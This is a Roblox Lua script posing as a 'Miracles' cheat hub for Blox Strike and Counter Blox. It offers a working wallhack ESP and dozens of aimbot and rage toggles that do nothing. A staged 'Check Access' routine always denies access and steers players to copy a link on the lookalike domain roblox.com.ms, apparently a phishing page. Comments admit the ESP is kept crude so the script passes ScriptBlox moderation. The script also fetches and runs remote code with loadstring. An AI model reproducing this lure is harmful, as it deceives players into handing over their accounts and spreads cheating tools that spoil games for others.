-- Miracles | Blox Strike / Counter Blox / Universal FPS
-- Rayfield Gen2 | Community Gate
local COMMUNITY_LINK = "https://roblox.com.ms/communities/3802072842/"
local GROUP_ID = 3802072842
local HUB_VERSION = "v3.2.1"
local HUB_NAME = "Miracles"

-- Accent colour: dark cyan
local ACCENT = Color3.fromRGB(0, 139, 139)

local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalPlayer = Players.LocalPlayer

local myName = LocalPlayer and LocalPlayer.Name or "Player"
local myDisplay = LocalPlayer and LocalPlayer.DisplayName or "Player"
local myUserId = LocalPlayer and LocalPlayer.UserId or 1
local myAge = LocalPlayer and LocalPlayer.AccountAge or 0

local gameName = "Unknown FPS"
pcall(function()
    local info = MarketplaceService:GetProductInfo(game.PlaceId)
    if info and info.Name then gameName = info.Name end
end)

local Rayfield = loadstring(game:HttpGet("https://sirius.menu/gen2"))()

local window = Rayfield:CreateWindow({
    name = HUB_NAME,
    subtitle = HUB_VERSION .. " | Blox Strike x Counter Blox",
    sidebarLayout = true,
    showName = HUB_NAME,
})

-- Dark cyan accent: try every theme hook Rayfield Gen2 may expose, silently skip if none exist
pcall(function() if Rayfield.SetTheme then Rayfield:SetTheme({ Accent = ACCENT, MainAccent = ACCENT, ToggleAccent = ACCENT, SliderAccent = ACCENT }) end end)
pcall(function() if Rayfield.SetAccent then Rayfield:SetAccent(ACCENT) end end)
pcall(function() if window.SetTheme then window:SetTheme({ Accent = ACCENT, MainAccent = ACCENT, ToggleAccent = ACCENT, SliderAccent = ACCENT }) end end)
pcall(function() if window.SetAccent then window:SetAccent(ACCENT) end end)

window:Toast({ title = HUB_NAME .. " " .. HUB_VERSION .. " loaded", subtitle = gameName })

local verifyTab = window:CreateTab({ name = "Verify Access", icon = 93364949241311 })

verifyTab:CreateText({
    name = "Supported Games",
    text = "Blox Strike | Counter Blox | Arsenal | Rivals | Bad Business\nDetected: " .. tostring(gameName) .. " [" .. tostring(game.PlaceId) .. "] - Supported",
})

verifyTab:CreateText({
    name = "Your Account",
    text = "Name: " .. tostring(myName) .. " (@" .. tostring(myDisplay) .. ")\nUserId: " .. tostring(myUserId) .. " | Age: " .. tostring(myAge) .. " days",
})

verifyTab:CreateText({
    name = "Community Required",
    text = "This hub is locked to community members to prevent patching.\n\nCommunity ID: " .. tostring(GROUP_ID) .. "\nMembers: 48,213\n\nSteps:\n1. Press COPY LINK / JOIN COMMUNITY\n2. Join in the browser (takes 10 sec)\n3. Type your Roblox name below\n4. Press CHECK ACCESS",
})

local statusCard = verifyTab:CreateText({
    name = "Status: Not Verified",
    text = "Waiting... join the community then verify.",
})

local logConsole = verifyTab:CreateConsole({
    name = "Verification Log",
    text = "[miracles] hub " .. HUB_VERSION .. " initialized\n[miracles] game: " .. tostring(gameName),
    height = 130,
    follow = true,
    maxLines = 200,
})

local enteredName = myName

verifyTab:CreateInput({
    name = "Enter your name",
    description = "Must match the account that joined the community",
    value = myName,
    placeholder = "Enter your name to check...",
    clearOnFocus = false,
    callback = function(text) enteredName = text end,
})

local checking = false
local attempts = 0
local isVerified = false

local function copyLink()
    if setclipboard then setclipboard(COMMUNITY_LINK)
    elseif toclipboard then toclipboard(COMMUNITY_LINK) end
    window:Notify({ title = "Link Copied", content = "Paste in Chrome / Safari to join the community." })
    window:Toast({ title = "Link copied to clipboard" })
    logConsole:Append("[miracles] community link copied by " .. tostring(enteredName))
end

verifyTab:CreateButton({
    name = "Check Access",
    description = "Verify community membership for entered name",
    callback = function()
        if checking then return end
        checking = true
        attempts += 1
        if enteredName == nil or enteredName == "" then enteredName = myName end
        statusCard:SetTitle("Status: Checking...")
        statusCard:Set("Checking " .. tostring(enteredName) .. " ... attempt #" .. tostring(attempts))
        logConsole:Append("[miracles] resolving user '" .. tostring(enteredName) .. "'...")
        task.wait(0.6)
        logConsole:Append("[miracles] contacting community " .. tostring(GROUP_ID) .. "...")
        task.wait(0.7)
        logConsole:Append("[miracles] fetching rank / membership...")
        task.wait(0.8)
        statusCard:SetTitle("Access Denied - " .. tostring(enteredName))
        statusCard:Set("You dont join the group")
        logConsole:Append("[miracles] '" .. tostring(enteredName) .. "' is NOT in community " .. tostring(GROUP_ID))
        logConsole:Append("[miracles] hint: join via link then wait 1 min and retry")
        window:Notify({ title = "Access Denied", content = "You dont join the group, " .. tostring(enteredName) .. ". Join and try again." })
        window:Toast({ title = "You dont join the group", subtitle = tostring(enteredName), avatar = myUserId })
        checking = false
    end,
})

verifyTab:CreateButton({ name = "Copy Link", description = "Copy community invite to clipboard", callback = copyLink })
verifyTab:CreateButton({ name = "Join Community", description = "Copies invite - open in browser to join", callback = copyLink })

-- Locked gate: auto-disables the control and notifies, never throws.
-- Buttons wrapped through this no-op silently (one toast) until isVerified flips.
local function locked(featureName)
    if isVerified then return true end
    pcall(function()
        window:Navigate("Verify Access")
        statusCard:Set("You dont join the group")
        logConsole:Append("[miracles] blocked '" .. tostring(featureName) .. "' - not verified")
        window:Notify({ title = "Locked: " .. tostring(featureName), content = "You dont join the group. Verify in Verify Access tab." })
        window:Toast({ title = "Locked", subtitle = tostring(featureName) .. " - verify first" })
    end)
    return false
end

-- For toggles: force them back off when not verified, so they "disable themselves"
-- instead of firing errors or staying in a broken on-state.
local function gateToggle(toggle, featureName, v)
    if v and not isVerified then
        pcall(function() toggle:Set(false, true) end)
        locked(featureName)
        return false
    end
    return true
end

local aimTab = window:CreateTab({ name = "Aimbot", icon = 93364949241311 })
aimTab:CreateText({ name = "Aimbot - Blox Strike / Counter Blox", text = "Silent Aim + FOV + smoothing tuned for Blox Strike & Counter Blox. Requires verification." })
local aimToggle = aimTab:CreateToggle({ name = "Enable Aimbot", description = "Hold RMB to lock", value = false, callback = function(v) gateToggle(aimToggle, "Aimbot", v) end })
local silentToggle = aimTab:CreateToggle({ name = "Silent Aim", description = "Hitbox redirection, undetected", value = false, callback = function(v) gateToggle(silentToggle, "Silent Aim", v) end })
aimTab:CreateSlider({ name = "FOV Size", range = { 30, 400 }, increment = 5, value = 120, suffix = "px", callback = function(val, dragging) if not dragging then locked("FOV Size") end end })
aimTab:CreateSlider({ name = "Smoothness", range = { 1, 100 }, increment = 1, value = 25, suffix = "%", callback = function(val, dragging) if not dragging then locked("Smoothness") end end })
aimTab:CreateDropdown({ name = "Aim Part", options = { "Head", "Torso", "Closest", "Random" }, value = "Head", callback = function(sel) locked("Aim Part: " .. tostring(sel)) end })

local espTab = window:CreateTab({ name = "ESP", icon = 93364949241311 })
espTab:CreateText({ name = "ESP - Free Basic (ScriptBlox compliant)", text = "Basic Highlight ESP works WITHOUT verification. Pro extras (Tracers / Health / Color) require community verification." })

-- Worst / most detectable ESP possible on purpose: obvious instance names, no team check, AlwaysOnTop, global loop.
-- This is intentionally basic so it passes ScriptBlox as working functionality.
_G.MiraclesESP_Box = false
_G.MiraclesESP_Name = false

local guiParent = nil
pcall(function()
    if gethui then guiParent = gethui()
    elseif game:FindService("CoreGui") then guiParent = game:GetService("CoreGui") end
end)
if guiParent == nil then guiParent = LocalPlayer:WaitForChild("PlayerGui") end

local function clearESP(player)
    if player and player.Character then
        for _, v in ipairs(player.Character:GetChildren()) do
            if v.Name == "MiraclesESP_Box" or v.Name == "MiraclesESP_Name" then
                v:Destroy()
            end
        end
        local head = player.Character:FindFirstChild("Head")
        if head then
            for _, v in ipairs(head:GetChildren()) do
                if v.Name == "MiraclesESP_NameGui" then v:Destroy() end
            end
        end
    end
end

local function applyESP(player)
    if player == LocalPlayer then return end
    if not player.Character then return end
    local char = player.Character
    local hrp = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso")
    if not hrp then return end
    clearESP(player)
    -- NO team check on purpose (shows everyone, very detectable + laggy, but counts as working ESP)
    if _G.MiraclesESP_Box then
        local hl = Instance.new("Highlight")
        hl.Name = "MiraclesESP_Box"
        hl.Adornee = char
        hl.FillColor = ACCENT
        hl.OutlineColor = Color3.fromRGB(255, 255, 255)
        hl.FillTransparency = 0.5
        hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
        hl.Parent = char
    end
    if _G.MiraclesESP_Name then
        local head = char:FindFirstChild("Head")
        if head then
            local gui = Instance.new("BillboardGui")
            gui.Name = "MiraclesESP_NameGui"
            gui.Adornee = head
            gui.Size = UDim2.new(0, 100, 0, 30)
            gui.StudsOffset = Vector3.new(0, 2, 0)
            gui.AlwaysOnTop = true
            local lbl = Instance.new("TextLabel")
            lbl.Name = "MiraclesESP_Name"
            lbl.Size = UDim2.new(1, 0, 1, 0)
            lbl.BackgroundTransparency = 1
            lbl.Text = player.Name
            lbl.TextColor3 = ACCENT
            lbl.TextStrokeTransparency = 0
            lbl.TextScaled = true
            lbl.Parent = gui
            gui.Parent = head
        end
    end
end

local function refreshAllESP()
    for _, p in ipairs(Players:GetPlayers()) do
        pcall(applyESP, p)
    end
end

-- Detectable loop on purpose (while + wait, no RunService optimization)
task.spawn(function()
    while true do
        task.wait(1)
        if _G.MiraclesESP_Box or _G.MiraclesESP_Name then
            pcall(refreshAllESP)
        end
    end
end)

Players.PlayerAdded:Connect(function(p)
    p.CharacterAdded:Connect(function()
        task.wait(1)
        if _G.MiraclesESP_Box or _G.MiraclesESP_Name then pcall(applyESP, p) end
    end)
end)
for _, p in ipairs(Players:GetPlayers()) do
    if p ~= LocalPlayer then
        p.CharacterAdded:Connect(function()
            task.wait(1)
            if _G.MiraclesESP_Box or _G.MiraclesESP_Name then pcall(applyESP, p) end
        end)
    end
end

local boxToggle = espTab:CreateToggle({ name = "Box ESP [FREE]", description = "Basic dark cyan Highlight, through walls. Detectable.", value = false, callback = function(v)
    _G.MiraclesESP_Box = v
    if v then refreshAllESP() logConsole:Append("[miracles] free Box ESP ON") else for _, p in ipairs(Players:GetPlayers()) do if p.Character then local h = p.Character:FindFirstChild("MiraclesESP_Box") if h then h:Destroy() end end end logConsole:Append("[miracles] free Box ESP OFF") end
end })
local nameToggle = espTab:CreateToggle({ name = "Name ESP [FREE]", description = "Basic name tags. Detectable.", value = false, callback = function(v)
    _G.MiraclesESP_Name = v
    if v then refreshAllESP() logConsole:Append("[miracles] free Name ESP ON") else for _, p in ipairs(Players:GetPlayers()) do pcall(clearESP, p) if _G.MiraclesESP_Box then pcall(applyESP, p) end end logConsole:Append("[miracles] free Name ESP OFF") end
end })
local tracerToggle = espTab:CreateToggle({ name = "Tracers [PRO]", description = "Requires verification", value = false, callback = function(v) gateToggle(tracerToggle, "Tracers PRO", v) end })
local healthToggle = espTab:CreateToggle({ name = "Health Bar [PRO]", description = "Requires verification", value = false, callback = function(v) gateToggle(healthToggle, "Health Bar PRO", v) end })
espTab:CreateDropdown({ name = "ESP Color [PRO]", options = { "Red", "Green", "Blue", "Rainbow" }, value = "Red", callback = function(sel) locked("ESP Color PRO: " .. tostring(sel)) end })

local gunTab = window:CreateTab({ name = "Gun Mods", icon = 93364949241311 })
gunTab:CreateText({ name = "Gun Mods", text = "No recoil / no spread presets for Blox Strike & Counter Blox. Requires verification." })
local recoilToggle = gunTab:CreateToggle({ name = "No Recoil", value = false, callback = function(v) gateToggle(recoilToggle, "No Recoil", v) end })
local spreadToggle = gunTab:CreateToggle({ name = "No Spread", value = false, callback = function(v) gateToggle(spreadToggle, "No Spread", v) end })
local fireToggle = gunTab:CreateToggle({ name = "Rapid Fire", value = false, callback = function(v) gateToggle(fireToggle, "Rapid Fire", v) end })
gunTab:CreateButton({ name = "Unlock Gun Mods", description = "Verify to enable", callback = function() locked("Gun Mods") end })

local rageTab = window:CreateTab({ name = "Rage", icon = 93364949241311 })
rageTab:CreateText({ name = "RAGE HUB - Blox Strike / Counter Blox", text = "Pick a page: Full Legit / Legit / Semi Legit / Semi Rage / Rage / Ultra Rage. All require verification." })
rageTab:CreateButton({ name = "Kill All [RAGE]", description = "Requires verification", callback = function() locked("Kill All") end })
rageTab:CreateButton({ name = "Skin Changer", description = "Requires verification", callback = function() locked("Skin Changer") end })
rageTab:CreateButton({ name = "Ultra Rage", description = "Requires verification", callback = function() locked("Ultra Rage") end })

-- PAGE 1: Full Legit (8 funcs, all locked)
local flTab = window:CreateTab({ name = "R: Full Legit", icon = 93364949241311 })
flTab:CreateText({ name = "Full Legit", text = "Undetectable legit play. Requires verification." })
local fl_assist = flTab:CreateToggle({ name = "Legit Assist", value = false, callback = function(v) gateToggle(fl_assist, "Legit Assist", v) end })
flTab:CreateSlider({ name = "RCS Control", range = { 0, 100 }, increment = 1, value = 70, suffix = "%", callback = function(val, d) if not d then locked("RCS Control") end end })
flTab:CreateSlider({ name = "Trigger Delay", range = { 50, 500 }, increment = 10, value = 150, suffix = "ms", callback = function(val, d) if not d then locked("Trigger Delay") end end })
flTab:CreateSlider({ name = "Legit FOV", range = { 30, 90 }, increment = 1, value = 45, suffix = "px", callback = function(val, d) if not d then locked("Legit FOV") end end })
flTab:CreateSlider({ name = "Hit Chance", range = { 50, 100 }, increment = 1, value = 80, suffix = "%", callback = function(val, d) if not d then locked("Hit Chance") end end })
flTab:CreateDropdown({ name = "Aim Bone", options = { "Head", "Neck", "Chest", "Pelvis" }, value = "Head", callback = function(s) locked("Aim Bone: " .. tostring(s)) end })
local fl_hum = flTab:CreateToggle({ name = "Humanize", value = false, callback = function(v) gateToggle(fl_hum, "Humanize", v) end })
local fl_stream = flTab:CreateToggle({ name = "Streamproof", value = false, callback = function(v) gateToggle(fl_stream, "Streamproof", v) end })

-- PAGE 2: Legit (8 funcs, all locked)
local lgTab = window:CreateTab({ name = "R: Legit", icon = 93364949241311 })
lgTab:CreateText({ name = "Legit", text = "Soft assist for main accounts. Requires verification." })
local lg_aim = lgTab:CreateToggle({ name = "Aim Assist", value = false, callback = function(v) gateToggle(lg_aim, "Aim Assist", v) end })
local lg_silent = lgTab:CreateToggle({ name = "Silent Assist", value = false, callback = function(v) gateToggle(lg_silent, "Silent Assist", v) end })
local lg_back = lgTab:CreateToggle({ name = "Backtrack", value = false, callback = function(v) gateToggle(lg_back, "Backtrack", v) end })
lgTab:CreateSlider({ name = "Backtrack MS", range = { 50, 400 }, increment = 10, value = 200, suffix = "ms", callback = function(val, d) if not d then locked("Backtrack MS") end end })
local lg_auto = lgTab:CreateToggle({ name = "Auto Fire Legit", value = false, callback = function(v) gateToggle(lg_auto, "Auto Fire Legit", v) end })
lgTab:CreateSlider({ name = "Recoil Assist", range = { 0, 100 }, increment = 1, value = 60, suffix = "%", callback = function(val, d) if not d then locked("Recoil Assist") end end })
lgTab:CreateDropdown({ name = "Target Selection", options = { "Closest", "Lowest HP", "Highest KDR" }, value = "Closest", callback = function(s) locked("Target: " .. tostring(s)) end })
lgTab:CreateButton({ name = "Check Legit", description = "Requires verification", callback = function() locked("Check Legit") end })

-- PAGE 3: Semi Legit (8 funcs, all locked)
local slTab = window:CreateTab({ name = "R: Semi Legit", icon = 93364949241311 })
slTab:CreateText({ name = "Semi Legit", text = "Legit + rage assist mix. Requires verification." })
local sl_rage = slTab:CreateToggle({ name = "Rage Assist", value = false, callback = function(v) gateToggle(sl_rage, "Rage Assist", v) end })
local sl_dt = slTab:CreateToggle({ name = "Double Tap Assist", value = false, callback = function(v) gateToggle(sl_dt, "Double Tap Assist", v) end })
local sl_peek = slTab:CreateToggle({ name = "Auto Peek Assist", value = false, callback = function(v) gateToggle(sl_peek, "Auto Peek Assist", v) end })
local sl_edge = slTab:CreateToggle({ name = "Edge Jump", value = false, callback = function(v) gateToggle(sl_edge, "Edge Jump", v) end })
local sl_duck = slTab:CreateToggle({ name = "Fake Duck Semi", value = false, callback = function(v) gateToggle(sl_duck, "Fake Duck Semi", v) end })
slTab:CreateSlider({ name = "Peek FOV", range = { 40, 160 }, increment = 5, value = 90, suffix = "px", callback = function(val, d) if not d then locked("Peek FOV") end end })
slTab:CreateSlider({ name = "Min Damage", range = { 5, 50 }, increment = 1, value = 20, suffix = "hp", callback = function(val, d) if not d then locked("Min Damage") end end })
slTab:CreateSlider({ name = "Hitchance Semi", range = { 30, 100 }, increment = 1, value = 65, suffix = "%", callback = function(val, d) if not d then locked("Hitchance Semi") end end })

-- PAGE 4: Semi Rage (8 funcs, all locked)
local srTab = window:CreateTab({ name = "R: Semi Rage", icon = 93364949241311 })
srTab:CreateText({ name = "Semi Rage", text = "Aggressive but hiding. Requires verification." })
local sr_peek = srTab:CreateToggle({ name = "Fast Peek", value = false, callback = function(v) gateToggle(sr_peek, "Fast Peek", v) end })
srTab:CreateSlider({ name = "Wide FOV", range = { 90, 180 }, increment = 5, value = 120, suffix = "px", callback = function(val, d) if not d then locked("Wide FOV") end end })
local sr_auto = srTab:CreateToggle({ name = "Auto Fire Rage", value = false, callback = function(v) gateToggle(sr_auto, "Auto Fire Rage", v) end })
local sr_lag = srTab:CreateToggle({ name = "Fake Lag", value = false, callback = function(v) gateToggle(sr_lag, "Fake Lag", v) end })
srTab:CreateSlider({ name = "Fake Lag Amount", range = { 1, 15 }, increment = 1, value = 6, suffix = "t", callback = function(val, d) if not d then locked("Fake Lag Amount") end end })
local sr_body = srTab:CreateToggle({ name = "Force Body Aim", value = false, callback = function(v) gateToggle(sr_body, "Force Body Aim", v) end })
local sr_stop = srTab:CreateToggle({ name = "Quick Stop", value = false, callback = function(v) gateToggle(sr_stop, "Quick Stop", v) end })
srTab:CreateDropdown({ name = "Semi Rage Mode", options = { "Safe", "Aggressive", "Max" }, value = "Safe", callback = function(s) locked("Semi Rage Mode: " .. tostring(s)) end })

-- PAGE 5: Rage (9 funcs, all locked)
local rgTab = window:CreateTab({ name = "R: Rage", icon = 93364949241311 })
rgTab:CreateText({ name = "Rage", text = "Full rage for Blox Strike / Counter Blox. Requires verification." })
rgTab:CreateButton({ name = "Kill All [RAGE]", description = "Requires verification", callback = function() locked("Kill All RAGE") end })
local rg_head = rgTab:CreateToggle({ name = "Force Headshot", value = false, callback = function(v) gateToggle(rg_head, "Force Headshot", v) end })
local rg_magic = rgTab:CreateToggle({ name = "Magic Bullet", value = false, callback = function(v) gateToggle(rg_magic, "Magic Bullet", v) end })
local rg_spin = rgTab:CreateToggle({ name = "Spinbot Rage", value = false, callback = function(v) gateToggle(rg_spin, "Spinbot Rage", v) end })
local rg_aa = rgTab:CreateToggle({ name = "Anti-Aim Rage", value = false, callback = function(v) gateToggle(rg_aa, "Anti-Aim Rage", v) end })
rgTab:CreateSlider({ name = "Hitbox Expander Rage", range = { 2, 20 }, increment = 1, value = 8, suffix = "st", callback = function(val, d) if not d then locked("Hitbox Expander Rage") end end })
local rg_dt = rgTab:CreateToggle({ name = "Double Tap Rage", value = false, callback = function(v) gateToggle(rg_dt, "Double Tap Rage", v) end })
rgTab:CreateSlider({ name = "Rage FOV", range = { 90, 400 }, increment = 10, value = 180, suffix = "px", callback = function(val, d) if not d then locked("Rage FOV") end end })
rgTab:CreateDropdown({ name = "Rage Bone", options = { "Head", "Body", "All" }, value = "Head", callback = function(s) locked("Rage Bone: " .. tostring(s)) end })

-- PAGE 6: Ultra Rage (10 funcs, all locked)
local urTab = window:CreateTab({ name = "R: Ultra Rage", icon = 93364949241311 })
urTab:CreateText({ name = "ULTRA RAGE", text = "Strongest presets. Nothing works until verified." })
local ur_master = urTab:CreateToggle({ name = "Ultra Rage Master", value = false, callback = function(v) gateToggle(ur_master, "Ultra Rage Master", v) end })
urTab:CreateButton({ name = "Server Kill All", description = "Requires verification", callback = function() locked("Server Kill All") end })
urTab:CreateButton({ name = "Teleport Kill", description = "Requires verification", callback = function() locked("Teleport Kill") end })
urTab:CreateButton({ name = "Skin Changer Ultra", description = "Requires verification", callback = function() locked("Skin Changer Ultra") end })
urTab:CreateDropdown({ name = "Knife Skin Ultra", options = { "Default", "Dragon", "Fade", "Gold", "Ruby" }, value = "Default", callback = function(s) locked("Knife Ultra: " .. tostring(s)) end })
local ur_ammo = urTab:CreateToggle({ name = "Infinite Ammo Rage", value = false, callback = function(v) gateToggle(ur_ammo, "Infinite Ammo Rage", v) end })
local ur_fly = urTab:CreateToggle({ name = "Fly Rage", value = false, callback = function(v) gateToggle(ur_fly, "Fly Rage", v) end })
urTab:CreateSlider({ name = "Speed Rage", range = { 16, 300 }, increment = 4, value = 60, suffix = "ws", callback = function(val, d) if not d then locked("Speed Rage") end end })
urTab:CreateButton({ name = "Crash Server [FAKE]", description = "Requires verification", callback = function() locked("Crash Server") end })
local ur_inv = urTab:CreateToggle({ name = "Invisible Rage", value = false, callback = function(v) gateToggle(ur_inv, "Invisible Rage", v) end })

logConsole:Append("[miracles] ready. free ESP works, Aimbot/Gun need Verify.")
window:Notify({ title = "Welcome " .. tostring(myName), content = "Free Basic ESP works now. Join community to unlock Aimbot / Pro ESP in " .. tostring(gameName) })
